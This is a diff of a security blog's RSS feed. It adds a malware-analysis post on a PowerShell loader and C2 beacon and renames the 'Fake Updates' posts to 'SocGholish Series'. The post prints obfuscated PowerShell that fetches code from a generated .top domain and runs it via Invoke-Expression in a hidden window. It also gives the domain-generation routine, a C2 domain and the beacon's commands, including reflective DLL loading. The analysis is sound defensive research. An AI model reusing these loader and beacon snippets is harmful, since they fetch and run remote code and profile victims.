+</span><span style="color:#e6db74">	new-alias rzs $(&#39;</span>invoke-expression<span style="color:#e6db74">&#39;) ;
+</span><span style="color:#e6db74">	$rand_int = New-Object ($(&#39;</span>System.Random<span style="color:#e6db74">&#39;) )([int]((((Get-Date).DayOfYear+3) / 7) +2024)*1562);
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">	for ($i = 0; $i -lt 15; $i++) {
+</span><span style="color:#e6db74">		$rand_str += ($(&#39;</span>abcdefghijklmn<span style="color:#e6db74">&#39;) )[$rand_int.Next(0, 14)];
+</span><span style="color:#e6db74">	}
+</span><span style="color:#e6db74">	$global:block=(New-Object $(&#39;</span>System.Net.WebClient<span style="color:#e6db74">&#39;) ).($(&#39;</span>DownloadString<span style="color:#e6db74">&#39;) )($(&#39;</span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#e6db74">&#39;) +$rand_str+$(.top/523/sdfzw.php?i=) +$(hostname));
+</span><span style="color:#e6db74">	rzs $global:block&#39;</span>
+-WindowStyle hidden
+</code></pre></div><p>As shown above, a request will be made to a pseudo-random <code>.top</code> domain, all with the same hardcoded path of <code>/523/sdfzw.php</code>, and the victim hostname passed as a parameter in the format <code>?i=&lt;hostname&gt;</code>.</p>
+<p>The response from the <code>.top</code> domain will be saved to a global variable, <code>$global:block</code>, and then executed. We will explore this in the next section.</p>
+<h2 id="powershell-c2-beacon">PowerShell C2 Beacon</h2>
+<p>The response from the <code>.top</code> domain was roughly 580KB of raw PowerShell, which, as we saw previously, is piped directly to IEX.</p>
+<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <a href="images/sdfzw_php_response.png"  itemprop="contentUrl"> 
+        <img itemprop="thumbnail"
+            src="images/sdfzw_php_response.png"
+            alt="sdfzw_php_response"
+            />
+    </a>
+    
+</figure>
+<p>I went to work formatting and attempting to deobfuscate. Here is a <a href="https://gist.github.com/rerednawyerg/9632d828b05ee74eaa2928b37fe5d921">link</a> to the fully cleaned version to follow along with as you read.</p>
+<p>The first 150 or so lines are simple aliases, and on line 210, TypeAccelerators are used to create aliases for .NET framework classes.</p>
+<p>A few .NET core classes are added, and then on line 238 Invoke-Expression is called on a here-string, which is where the meat of the C2 beacon lives.</p>
+<h4 id="domain-generation">Domain Generation</h4>
+<p>After executing the here-string, the first thing the beacon does is create a list of domains.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">static <span style="color:#66d9ef">[void]</span> create_c2s(){ 
+	$temp_arr=@();
+	$date = Get-Date;
+	$week_of_year = <span style="color:#66d9ef">[int]</span>($date.((<span style="color:#e6db74">&#39;DayOfYear&#39;</span>)) / 7) + 1;
+	$year = $date.((<span style="color:#e6db74">&#39;Year&#39;</span>));
+	$seed_value = $week_of_year + $year * (429374);
+	$random_obj = New-Object ((<span style="color:#e6db74">&#39;System.Random&#39;</span>))($seed_value);
+
+	$fifteen = 15;
+	$alphanumeric = (<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span>);
+
+	<span style="color:#66d9ef">for</span> ($i = 0; $i <span style="color:#f92672">-lt</span> 10; $i++) { 
+		$temp_str = <span style="color:#e6db74">&#34;&#34;</span>;
+
+		<span style="color:#66d9ef">for</span> ($j = 0; $j <span style="color:#f92672">-lt</span> $fifteen; $j++) { 
+			$rand_index=$random_obj.((<span style="color:#e6db74">&#39;next&#39;</span>))(0, $alphanumeric.Length);
+			$temp_str += $alphanumeric[$rand_index];
+		}
+		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.top&#39;</span>);
+		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.fun&#39;</span>);
+		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.com&#39;</span>);
+		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.cn&#39;</span>);
+
+	} 
+	<span style="color:#66d9ef">[C2s_class]</span>::c2_array=$temp_arr 
+}
+</code></pre></div><p>Ten domains will be generated, each fifteen characters in length, and at first glance these domains will be completely random.</p>
+<p>However, the <code>$week_of_year</code> variable will help control the output of the Random object which is created with the seed value.</p>
+<p>To demonstrate, running the following will always produce the same series of digits in <code>$random_obj</code>, the first four of which are: 35, 23, 10, and **2.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Powershell" data-lang="Powershell">$date = Get-Date;
+$day_of_year = 25;
+$year = $date.((<span style="color:#e6db74">&#39;Year&#39;</span>));
+$seed_value = $day_of_year + $year * (429374);
+$random_obj = New-Object ((<span style="color:#e6db74">&#39;System.Random&#39;</span>))($seed_value);
+$fifteen = 15;
+$alphanumeric = (<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span>);
+</code></pre></div><p>If we select the characters at the index of <code>$alphanumeric</code> which correspond with these digits, we get <code>9xkc..</code>.</p>
+<p>Spoiler alert, the domain which responds to the C2 beacon is <code>9xkcaayaagvr1p2[.]top</code>.</p>
+<p>Hypothetically, this could be used to predict the C2 domains which will be used over the next weeks or months.</p>
+<p>Of course, all the threat actor has to do is change the hardcoded digit used to generate the seed value and the output will be altered, so this information, while interesting, probably doesn&rsquo;t have much real-world value.</p>
+<h4 id="mutex">Mutex</h4>
+<p>Once the domains have been generated, the beacon checks whether a mutex named <code>rusgugh</code> exists, and if so, the beacon will terminate.</p>
+<p>If the mutex does not exist, it will be created, and execution continues.</p>
+<h4 id="connect-to-c2">Connect to C2</h4>
+<p>With the domains created and the mutex check completed, the beacon now enters an infinite loop, calling a series of functions which will communicate with a C2 server.</p>
+<p>The beacon will determine if any of the generated domains resolve to an IP address, and if so, will use a TCP socket to connect to it on port <code>14235</code>.</p>
+<p>If the beacon connects to the C2 successfully, it will then gather data about the victim device and send it to the C2 via an SslStream object.</p>
+<h4 id="device-enumeration">Device Enumeration</h4>
+<p>The beacon will gather the following data about the device:</p>
+<ul>
+<li>AV Products</li>
+<li>IP address (using api.ipify.org)</li>
+<li>Device Name</li>
+<li>User Name</li>
+<li>OS Arch Type (64bit or 32bit)</li>
+<li>Whether the user is in the built-in administrator role</li>
+<li>Whether the device is domain joined</li>
+</ul>
+<p>This data is organized in a hashtable, converted to JSON, and then Gzip compressed. The compressed data is converted to a byte array and sent to the C2 via the SSL stream.</p>
+<h4 id="c2-response">C2 Response</h4>
+<p>Once the C2 responds, the beacon parses the request. If it determines there are commands to be executed, it passes the response to another function, which I&rsquo;ve named <code>perform_c2_command</code>.</p>
+<p>The function will Gzip decompress the response, and convert it from JSON into a hashtable.</p>
+<p>Then, the value of the <code>Packet</code> key in the hashtable is passed to a switch statement, and different actions are performed.</p>
+<p>All responses to the C2 are gzipped and sent over the SSL stream.
+Valid switch statement values:</p>
+<pre><code class="language-String" data-lang="String">wdnkbajgcmqx - sends a global count variable back to the C2.
+plugin - stores an argument string for a DLL sent by the C2 into a global variable
+iex - converts contents of the hashtable's `script` key from base64 and passes it to IEX
+cmd - calls start-process using the values of the hashtable's `cmd` and `args` keys as parameters
+selfdelete - performs &quot;remove-item $PWD\* -force -recurse exit&quot;
+savePlugin - passes a base64 encoded .NET assembly to the &quot;run_dll&quot; function
+</code></pre><p>The <code>run_dll</code> function mentioned above takes the base64 encoded byte array, reflectively loads it, and creates an instance of the specified type.</p>
+<p>It then calls the <code>Run</code> method on the instance with the following arguments:</p>
+<pre><code class="language-String" data-lang="String">$plugin_instance.(('Run'))(
+[customclass1]::tcp_socket, 
+[C2s_class]::ptr_raw_certificate, 
+[C2s_class]::machine_name, 
+[System.Convert]::(('FromBase64String'))([customclass1]::global_saved_parameter), 
+[mutex_class]::mutex, 
+$null, $null, $null  );
+</code></pre><p>At the time of writing this article, I have not gotten the C2 to give me a DLL as a response.</p>
+<p>The beacon now continues on an infinite loop, waiting for commands from the C2 server.</p>
+<h2 id="emulation">Emulation</h2>
+<p>For fun, lets see if we can emulate a victim machine and coax some responses out of the C2 server.</p>
+<p>I modified the script to log specific operations as well as requests and responses to and from the server.</p>
+]]></content>
+        </item>
         
         <item>
             <title>Unraveling a Stealc Dropper</title>
@@ -1810,12 +2170,12 @@ ScanScheduleDay : 8
         </item>
         
         <item>
-            <title>Fake Updates - Part 2</title>
+            <title>SocGholish Series - Part 2</title>
             <link>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part2/</link>
             <pubDate>Mon, 23 Jan 2023 19:47:27 -0600</pubDate>
             
             <guid>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part2/</guid>
-            <description>In the previous post, &amp;ldquo;Fake Updates - Part 1&amp;rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &amp;ldquo;update their browser&amp;rdquo;.</description>
+            <description>In the previous post, &amp;ldquo;SocGholish Series - Part 1&amp;rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &amp;ldquo;update their browser&amp;rdquo;.</description>
             <content type="html"><![CDATA[<hr>
 <p>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
@@ -1872,7 +2232,7 @@ ScanScheduleDay : 8
 <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
 <script src="/js/pswp-init.js"></script>
 
-In the previous post, &ldquo;Fake Updates - Part 1&rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &ldquo;update their browser&rdquo;. I walked through the steps leading up to the download, and in this post will pick up where I left off and delve into the contents of the JavaScript payload.</p>
+In the previous post, &ldquo;SocGholish Series - Part 1&rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &ldquo;update their browser&rdquo;. I walked through the steps leading up to the download, and in this post will pick up where I left off and delve into the contents of the JavaScript payload.</p>
 <hr>
 <h3 id="first-look-at-the-payload">First Look At The Payload</h3>
 <p>Cracking the JavaScript download open in SublimeText, it seems to be quite large and crammed together.</p>
@@ -2061,7 +2421,7 @@ Look for a part three in the future where I will capture and analyze the next ph
         </item>
         
         <item>
-            <title>Fake Updates - Part 1</title>
+            <title>SocGholish Series - Part 1</title>
             <link>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish/</link>
             <pubDate>Thu, 12 Jan 2023 15:57:49 -0600</pubDate>
             
